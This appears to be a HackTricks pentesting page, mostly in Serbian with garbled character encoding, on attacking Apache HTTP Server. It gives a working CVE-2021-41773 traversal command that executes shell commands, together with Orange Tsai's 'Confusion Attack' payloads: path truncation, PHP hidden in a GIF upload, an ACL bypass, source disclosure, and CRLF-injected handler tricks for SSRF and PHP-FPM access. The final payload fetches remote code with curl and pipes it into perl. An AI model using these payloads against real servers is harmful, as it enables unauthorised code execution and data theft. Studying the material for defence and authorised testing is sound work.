# Apache

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## IzvrÅ¡ne PHP ekstenzije

Proverite koje ekstenzije izvrÅ¡ava Apache server. Da biste ih pretraÅ¾ili, moÅ¾ete izvrÅ¡iti:
```bash
grep -R -B1 "httpd-php" /etc/apache2
```
TakoÄ‘e, neka mesta gde moÅ¾ete pronaÄ‡i ovu konfiguraciju su:
```bash
/etc/apache2/mods-available/php5.conf
/etc/apache2/mods-enabled/php5.conf
/etc/apache2/mods-available/php7.3.conf
/etc/apache2/mods-enabled/php7.3.conf
```
## CVE-2021-41773

{% code overflow="wrap" %}
```bash
curl http://172.18.0.15/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
Linux
```
{% endcode %}

## Confusion Attack <a href="#a-whole-new-attack-confusion-attack" id="a-whole-new-attack-confusion-attack"></a>

Ove vrste napada su predstavljene i dokumentovane [**od strane Orange u ovom blog postu**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1) i sledeÄ‡i je saÅ¾etak. Napad "confusion" u suÅ¡tini zloupotrebljava naÄin na koji desetine modula koji rade zajedno na kreiranju Apache-a ne rade savrÅ¡eno sinkronizovano, a modifikacija nekih od njih moÅ¾e izazvati ranjivost u kasnijem modulu.

### Filename Confusion

#### Truncation

**`mod_rewrite`** Ä‡e skratiti sadrÅ¾aj `r->filename` nakon karaktera `?` ([_**modules/mappers/mod\_rewrite.c#L4141**_](https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod\_rewrite.c#L4141)). Ovo nije potpuno pogreÅ¡no jer Ä‡e veÄ‡ina modula tretirati `r->filename` kao URL. MeÄ‘utim, u drugim prilikama ovo Ä‡e biti tretirano kao putanja do fajla, Å¡to bi moglo izazvati problem.

* **Path Truncation**

MoguÄ‡e je zloupotrebiti `mod_rewrite` kao u sledeÄ‡em primeru pravila da bi se pristupilo drugim fajlovima unutar fajl sistema, uklanjajuÄ‡i poslednji deo oÄekivane putanje jednostavno dodajuÄ‡i `?`:
```bash
RewriteEngine On
RewriteRule "^/user/(.+)$" "/var/user/$1/profile.yml"

# Expected
curl http://server/user/orange
# the output of file `/var/user/orange/profile.yml`

# Attack
curl http://server/user/orange%2Fsecret.yml%3F
#Â the output of file `/var/user/orange/secret.yml`
```
* **ZavaravajuÄ‡a dodela RewriteFlag**

U sledeÄ‡em pravilu preusmeravanja, sve dok URL zavrÅ¡ava sa .php, biÄ‡e tretiran i izvrÅ¡en kao php. Stoga, moguÄ‡e je poslati URL koji se zavrÅ¡ava sa .php nakon `?` karaktera dok se u putanji uÄitava drugaÄija vrsta datoteke (poput slike) sa zloÄ‡udnim php kodom unutar nje:
```bash
RewriteEngine On
RewriteRule  ^(.+\.php)$  $1  [H=application/x-httpd-php]

# Attacker uploads a gif file with some php code
curl http://server/upload/1.gif
# GIF89a <?=`id`;>

# Make the server execute the php code
curl http://server/upload/1.gif%3fooo.php
# GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
#### **ACL Bypass**

MoguÄ‡e je pristupiti datotekama kojima korisnik ne bi trebao imati pristup, Äak i ako bi pristup trebao biti odbijen sa konfiguracijama kao Å¡to su:
```xml
<Files "admin.php">
AuthType Basic
AuthName "Admin Panel"
AuthUserFile "/etc/apache2/.htpasswd"
Require valid-user
</Files>
```
Ovo je zato Å¡to Ä‡e PHP-FPM po defaultu primati URL-ove koji se zavrÅ¡avaju sa `.php`, kao Å¡to je `http://server/admin.php%3Fooo.php`, i zato Å¡to Ä‡e PHP-FPM ukloniti sve nakon karaktera `?`, prethodni URL Ä‡e omoguÄ‡iti uÄitavanje `/admin.php` Äak i ako je prethodno pravilo to zabranilo.

### DocumentRoot Confusion
```bash
DocumentRoot /var/www/html
RewriteRule  ^/html/(.*)$   /$1.html
```
Zanimljiva Äinjenica o Apache-u je da prethodni prepravak pokuÅ¡ava da pristupi datoteci i iz documentRoot-a i iz root-a. Dakle, zahtev za `https://server/abouth.html` Ä‡e proveriti datoteku u `/var/www/html/about.html` i `/about.html` u datoteÄnom sistemu. Å to se u suÅ¡tini moÅ¾e zloupotrebiti za pristup datotekama u datoteÄnom sistemu.

#### **Otkrivanje Izvora Koda na Serveru**

* **Otkrivanje CGI Izvora Koda**

Samo dodavanje %3F na kraju je dovoljno da se otkrije izvorni kod cgi modula:
```bash
curl http://server/cgi-bin/download.cgi
# the processed result from download.cgi
curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
# #!/usr/bin/perl
# use CGI;
# ...
# # the source code of download.cgi
```
* **Otkrivanje PHP Izvornog Koda**

Ako server ima razliÄite domene, pri Äemu je jedna od njih statiÄna domena, to se moÅ¾e iskoristiti za pretraÅ¾ivanje datoteÄnog sistema i otkrivanje php koda:
```bash
# Leak the config.php file of the www.local domain from the static.local domain
curl http://www.local/var/www.local/config.php%3F -H "Host: static.local"
# the source code of config.php
```
#### **Manipulacija lokalnim ureÄ‘ajima**

Glavni problem sa prethodnim napadom je to Å¡to Ä‡e po defaultu veÄ‡ina pristupa preko datoteÄnog sistema biti odbijena kao u [konfiguracionom Å¡ablonu](https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115) Apache HTTP Server-a:
```xml
<Directory />
AllowOverride None
Require all denied
</Directory>
```
MeÄ‘utim, [Debian/Ubuntu](https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165) operativni sistemi po defaultu dozvoljavaju `/usr/share`:
```xml
<Directory /usr/share>
AllowOverride None
Require all granted
</Directory>
```
Zato, bilo bi moguÄ‡e **zloupotrebiti datoteke smeÅ¡tene unutar `/usr/share` u ovim distribucijama.**

**Lokalni Gadget za OtkriÄ‡e Informacija**

* **Apache HTTP Server** sa **websocketd** moÅ¾e izloÅ¾iti **dump-env.php** skriptu na **/usr/share/doc/websocketd/examples/php/**, koja moÅ¾e otkriti osetljive promenljive okruÅ¾enja.
* Serveri sa **Nginx** ili **Jetty** mogu izloÅ¾iti osetljive informacije o web aplikacijama (npr., **web.xml**) kroz svoje podrazumevane web korene smeÅ¡tene pod **/usr/share**:
* **/usr/share/nginx/html/**
* **/usr/share/jetty9/etc/**
* **/usr/share/jetty9/webapps/**

**Lokalni Gadget za XSS**

* Na Ubuntu Desktop-u sa **instaliranim LibreOffice**, iskoriÅ¡Ä‡avanje funkcije promene jezika u pomoÄ‡nim datotekama moÅ¾e dovesti do **Cross-Site Scripting (XSS)**. Manipulacija URL-om na **/usr/share/libreoffice/help/help.html** moÅ¾e preusmeriti na zlonamerne stranice ili starije verzije putem **unsafe RewriteRule**.

**Lokalni Gadget za LFI**

* Ako su instalirani PHP ili odreÄ‘eni front-end paketi poput **JpGraph** ili **jQuery-jFeed**, njihove datoteke mogu biti iskoriÅ¡Ä‡ene za Äitanje osetljivih datoteka kao Å¡to je **/etc/passwd**:
* **/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php**
* **/usr/share/javascript/jquery-jfeed/proxy.php**
* **/usr/share/moodle/mod/assignment/type/wims/getcsv.php**

**Lokalni Gadget za SSRF**

* KoriÅ¡Ä‡enjem **MagpieRSS's magpie\_debug.php** na **/usr/share/php/magpierss/scripts/magpie\_debug.php**, moÅ¾e se lako stvoriti SSRF ranjivost, pruÅ¾ajuÄ‡i prolaz za dalja iskoriÅ¡Ä‡avanja.

**Lokalni Gadget za RCE**

* MoguÄ‡nosti za **Remote Code Execution (RCE)** su velike, sa ranjivim instalacijama poput zastare **PHPUnit** ili **phpLiteAdmin**. Ove se mogu iskoristiti za izvrÅ¡avanje proizvoljnog koda, pokazujuÄ‡i opseÅ¾an potencijal manipulacije lokalnim gadgetima.

#### **Jailbreak iz Lokalnih Gadgeta**

TakoÄ‘e je moguÄ‡e jailbreak-ovati iz dozvoljenih foldera prateÄ‡i symlinkove generisane instaliranim softverom u tim folderima, kao Å¡to su:

* **Cacti Log**: `/usr/share/cacti/site/` -> `/var/log/cacti/`
* **Solr Data**: `/usr/share/solr/data/` -> `/var/lib/solr/data`
* **Solr Config**: `/usr/share/solr/conf/` -> `/etc/solr/conf/`
* **MediaWiki Config**: `/usr/share/mediawiki/config/` -> `/var/lib/mediawiki/config/`
* **SimpleSAMLphp Config**: `/usr/share/simplesamlphp/config/` -> `/etc/simplesamlphp/`

Pored toga, zloupotrebom symlinkova bilo je moguÄ‡e dobiti **RCE u Redmine-u.**

### Confuzija Handler-a <a href="#id-3-handler-confusion" id="id-3-handler-confusion"></a>

Ovaj napad koristi preklapanje funkcionalnosti izmeÄ‘u `AddHandler` i `AddType` direktiva, koje se obe mogu koristiti za **omoguÄ‡avanje PHP obrade**. Prvobitno, ove direktive su uticale na razliÄita polja (`r->handler` i `r->content_type` respektivno) u unutraÅ¡njoj strukturi servera. MeÄ‘utim, zbog nasleÄ‘enog koda, Apache obraÄ‘uje ove direktive naizmeniÄno pod odreÄ‘enim uslovima, pretvarajuÄ‡i `r->content_type` u `r->handler` ako je prvi postavljen, a drugi nije.

Pored toga, u Apache HTTP Server-u (`server/config.c#L420`), ako je `r->handler` prazan pre izvrÅ¡avanja `ap_run_handler()`, server **koristi `r->content_type` kao handler**, efektivno ÄineÄ‡i `AddType` i `AddHandler` identiÄnim u efektu.

#### **Prepisivanje Handler-a za OtkriÄ‡e PHP Izvornog Koda**

U [**ovoj prezentaciji**](https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013\_dmitriev-maksim.pdf), predstavljena je ranjivost gde netaÄan `Content-Length` poslat od strane klijenta moÅ¾e uzrokovati da Apache greÅ¡kom **vrati PHP izvorni kod**. To je bilo zbog problema sa obradom greÅ¡aka sa ModSecurity i Apache Portable Runtime (APR), gde dvostruki odgovor dovodi do prepisivanja `r->content_type` na `text/html`.\
Zato Å¡to ModSecurity ne obraÄ‘uje pravilno povratne vrednosti, vraÄ‡a PHP kod i ne interpretira ga.

#### **Prepisivanje Handler-a za XXXX**

TODO: Orange joÅ¡ nije otkrio ovu ranjivost

### **Pozivanje Proizvoljnih Handler-a**

Ako napadaÄ moÅ¾e da kontroliÅ¡e **`Content-Type`** zaglavlje u odgovoru servera, moÄ‡i Ä‡e da **pozove proizvoljne module handler-a**. MeÄ‘utim, do trenutka kada napadaÄ kontroliÅ¡e ovo, veÄ‡ina procesa zahteva Ä‡e biti zavrÅ¡ena. Ipak, moguÄ‡e je **ponovo pokrenuti proces zahteva zloupotrebom `Location` zaglavlja** jer ako je **r**eturned `Status` 200 i `Location` zaglavlje poÄinje sa `/`, odgovor se tretira kao Server-Side Redirection i treba ga obraditi.

Prema [RFC 3875](https://datatracker.ietf.org/doc/html/rfc3875) (specifikacija o CGI) u [Sekciji 6.2.2](https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2) definiÅ¡e se ponaÅ¡anje lokalnog preusmeravanja odgovora:

> CGI skripta moÅ¾e vratiti URI putanju i upitni niz (â€˜local-pathqueryâ€™) za lokalni resurs u zaglavlju Location. Ovo ukazuje serveru da treba ponovo obraditi zahtev koristeÄ‡i specificiranu putanju.

Zato, za izvoÄ‘enje ovog napada potrebna je jedna od sledeÄ‡ih ranjivosti:

* CRLF Injection u CGI odgovorima zaglavlja
* SSRF sa potpunom kontrolom nad odgovorima zaglavlja

#### **Proizvoljni Handler za OtkriÄ‡e Informacija**

Na primer, `/server-status` bi trebao biti dostupan samo lokalno:
```xml
<Location /server-status>
SetHandler server-status
Require local
</Location>
```
MoguÄ‡e je pristupiti tome postavljanjem `Content-Type` na `server-status` i zaglavlja Location koje poÄinje sa `/`
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo %0d%0a
Content-Type:server-status %0d%0a
%0d%0a
```
#### **Arbitrarni Handler za Potpun SSRF**

Preusmeravanje na `mod_proxy` za pristup bilo kojem protokolu na bilo kojoj URL adresi:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:
http://example.com/%3F
%0d%0a
%0d%0a
```
MeÄ‘utim, `X-Forwarded-For` zaglavlje je dodato kako bi se spreÄio pristup krajnjim taÄkama metapodataka u oblaku.

#### **Arbitrarni Handler za Pristup Lokalnom Unix Domen Socketu**

Pristupite lokalnom Unix Domen Socketu PHP-FPM-a da biste izvrÅ¡ili PHP backdoor smeÅ¡ten u `/tmp/`:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php %0d%0a
%0d%0a
```
#### **Arbitrarni Handler za RCE**

SluÅ¾beni [PHP Docker](https://hub.docker.com/\_/php) imidÅ¾ ukljuÄuje PEAR (`Pearcmd.php`), alat za upravljanje PHP paketima putem komandne linije, koji se moÅ¾e zloupotrebiti za dobijanje RCE:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}
orange.tw/x|perl
) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
Check [**Docker PHP LFI Summary**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), written by [Phith0n](https://x.com/phithon\_xg) for the details of this technique.

## References

* [https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
